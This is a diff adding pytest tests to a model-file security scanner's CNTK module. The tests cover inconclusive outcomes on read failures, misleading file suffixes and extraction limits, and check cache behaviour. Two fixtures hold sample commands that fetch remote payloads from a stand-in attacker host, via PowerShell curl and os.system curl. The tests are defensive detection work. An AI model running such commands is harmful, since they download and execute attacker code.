@@ -2,7 +2,10 @@ from pathlib import Path
 
 import pytest
 
-from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, IssueSeverity
+from modelaudit.cache import get_cache_manager, reset_cache_manager
+from modelaudit.core import determine_exit_code, scan_model_directory_or_file
+from modelaudit.models import ModelAuditResultModel
+from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.cntk_scanner import DISCOVERY_ASSUMPTIONS, CntkScanner
 
 
@@ -17,6 +20,33 @@ def _write_cntkv2(path: Path, payload: bytes = b"", include_structure: bool = Tr
     path.write_bytes(prefix + structure + payload)
 
 
+def _scan_without_cache(path: Path) -> ModelAuditResultModel:
+    return scan_model_directory_or_file(str(path), cache_scan_results=False)
+
+
+def _assert_cntk_read_failure(
+    direct: ScanResult,
+    aggregate: ModelAuditResultModel,
+    path: Path,
+) -> None:
+    read_checks = [check for check in direct.checks if check.name == "CNTK File Read"]
+    assert len(read_checks) == 1
+    assert read_checks[0].severity == IssueSeverity.INFO
+    assert read_checks[0].details["analysis_incomplete"] is True
+    assert read_checks[0].details["scan_outcome_reason"] == "cntk_read_failed"
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "cntk_read_failed" in direct.metadata["scan_outcome_reasons"]
+    assert direct.metadata["operational_error"] is True
+    assert direct.metadata["operational_error_reason"] == "cntk_read_failed"
+
+    metadata = aggregate.file_metadata[str(path)]
+    assert "cntk_read_failed" in metadata["scan_outcome_reasons"]
+    assert not [
+        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert determine_exit_code(aggregate) == 2
+
+
 def test_cntk_scanner_can_handle_legacy_signature(tmp_path: Path) -> None:
     path = tmp_path / "legacy.dnn"
     _write_legacy_cntk(path, payload=b" inputs outputs ")
@@ -27,6 +57,18 @@ def test_cntk_scanner_can_handle_cntkv2_signature(tmp_path: Path) -> None:
     path = tmp_path / "graph.cmf"
     _write_cntkv2(path, payload=b" inputs outputs ")
     assert CntkScanner.can_handle(str(path))
+
+
+def test_cntk_scanner_can_handle_signature_with_misleading_suffix(tmp_path: Path) -> None:
+    path = tmp_path / "renamed.jpg"
+    _write_cntkv2(path, payload=b" inputs outputs ")
+    assert CntkScanner.can_handle(str(path))
+
+
+def test_cntk_scanner_rejects_renamed_structure_near_match(tmp_path: Path) -> None:
+    path = tmp_path / "near_match.jpg"
+    _write_cntkv2(path, payload=b" inputs outputs ", include_structure=False)
+    assert not CntkScanner.can_handle(str(path))
 
 
 def test_cntk_scanner_rejects_misnamed_non_cntk_file(tmp_path: Path) -> None:
@@ -47,6 +89,34 @@ def test_cntk_scanner_rejects_renamed_structure_near_match(tmp_path: Path) -> No
     _write_cntkv2(path, payload=b"inputs outputs", include_structure=False)
 
     assert not CntkScanner.can_handle(str(path))
+
+
+@pytest.mark.parametrize(
+    ("suffix", "expected"),
+    [
+        (".dnn", True),
+        (".cmf", True),
+        (".jpg", False),
+        (".txt", False),
+        (".lgb", False),
+        (".model", False),
+    ],
+)
+def test_cntk_scanner_only_claims_unreadable_dedicated_extensions(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    suffix: str,
+    expected: bool,
+) -> None:
+    path = tmp_path / f"unreadable{suffix}"
+    _write_cntkv2(path, payload=b" inputs outputs ")
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
+        raise OSError("simulated CNTK signature read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)
+
+    assert CntkScanner.can_handle(str(path)) is expected
 
 
 def test_cntk_scanner_reports_unsupported_variant_info(tmp_path: Path) -> None:
@@ -147,6 +217,250 @@ def test_cntk_scanner_marks_bounded_prefix_analysis_inconclusive(
     assert result.success is False
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "cntk_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]
+
+    cache_dir = tmp_path / "cache"
+    reset_cache_manager()
+    try:
+        first = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        second = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+
+        for aggregate in (first, second):
+            assert "cntk_bounded_read_incomplete" in aggregate.file_metadata[str(path)]["scan_outcome_reasons"]
+            assert determine_exit_code(aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_cntk_scanner_file_read_failure_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "unreadable.jpg"
+    _write_cntkv2(path)
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> tuple[bytes, bool]:
+        raise OSError("simulated CNTK read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_bounded", raise_os_error)
+
+    direct = CntkScanner().scan(str(path))
+
+    cache_dir = tmp_path / "cache"
+    reset_cache_manager()
+    try:
+        first = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        second = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+
+        for aggregate in (first, second):
+            _assert_cntk_read_failure(direct, aggregate, path)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_cntk_scanner_signature_read_failure_is_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "signature-unreadable.jpg"
+    _write_cntkv2(path)
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
+        raise OSError("simulated CNTK signature read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)
+
+    result = CntkScanner().scan(str(path))
+
+    cache_dir = tmp_path / "cache"
+    reset_cache_manager()
+    try:
+        first = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        second = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+
+        for aggregate in (first, second):
+            _assert_cntk_read_failure(result, aggregate, path)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_cntk_scanner_marks_late_string_payload_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "late-payload.jpg"
+    _write_cntkv2(
+        path,
+        payload=b"\x00safe_fragment_two\x00powershell -c curl http://evil.example/p.ps1\x00",
+    )
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_EXTRACTED_STRINGS", 2)
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "cntk_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+    budget_checks = [check for check in result.checks if check.name == "CNTK Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.FAILED
+    assert "stopped at the configured extraction limit" in budget_checks[0].message
+    assert budget_checks[0].details["analysis_incomplete"] is True
+
+    cache_dir = tmp_path / "cache"
+    reset_cache_manager()
+    try:
+        first = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        second = scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+
+        for aggregate in (first, second):
+            assert aggregate.file_metadata[str(path)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+            assert determine_exit_code(aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_cntk_scanner_inconclusive_warning_signal_is_not_successful(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "warning-before-limit.cmf"
+    _write_cntkv2(path)
+    monkeypatch.setattr(
+        "modelaudit.scanners.cntk_scanner._extract_candidate_strings",
+        lambda _data: (["os.system('curl http://evil.example/payload')"], True),
+    )
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert any(check.severity == IssueSeverity.WARNING for check in result.checks)
+
+
+def test_cntk_scanner_exact_string_limit_preserves_clean_result(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "exact-limit.jpg"
+    _write_cntkv2(path)
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_EXTRACTED_STRINGS", 2)
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is True
+    assert "scan_outcome" not in result.metadata
+    budget_checks = [check for check in result.checks if check.name == "CNTK Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.PASSED
+    assert budget_checks[0].details["analysis_incomplete"] is False
+
+
+def test_cntk_read_failure_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "unreadable.cmf"
+    _write_cntkv2(path, payload=b" safe metadata ")
+
+    def raise_os_error(_path: str, _max_bytes: int) -> tuple[bytes, bool]:
+        raise OSError("simulated CNTK read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_bounded", raise_os_error)
+
+    direct = CntkScanner().scan(str(path))
+    aggregate = _scan_without_cache(path)
+
+    _assert_cntk_read_failure(direct, aggregate, path)
+
+
+def test_cntk_signature_read_failure_still_routes_to_inconclusive_scan(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "signature-unreadable.cmf"
+    _write_cntkv2(path, payload=b" safe metadata ")
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
+        raise OSError("simulated CNTK signature read failure")
+
+    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
+    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)
+
+    aggregate = _scan_without_cache(path)
+
+    metadata = aggregate.file_metadata[str(path)]
+    assert "cntk_read_failed" in metadata["scan_outcome_reasons"]
+    assert determine_exit_code(aggregate) == 2
+
+
+def test_cntk_unreadable_path_preflight_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "permission-denied.cmf"
+    _write_cntkv2(path, payload=b" safe metadata ")
+
+    def deny_access(_path: str, _mode: int) -> bool:
+        return False
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
+        raise OSError("simulated permission-denied read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_access)
+    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
+    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)
+
+    direct = CntkScanner().scan(str(path))
+    aggregate = _scan_without_cache(path)
+
+    _assert_cntk_read_failure(direct, aggregate, path)
 
 
 def test_cntk_scanner_records_scope_assumptions(tmp_path: Path) -> None:
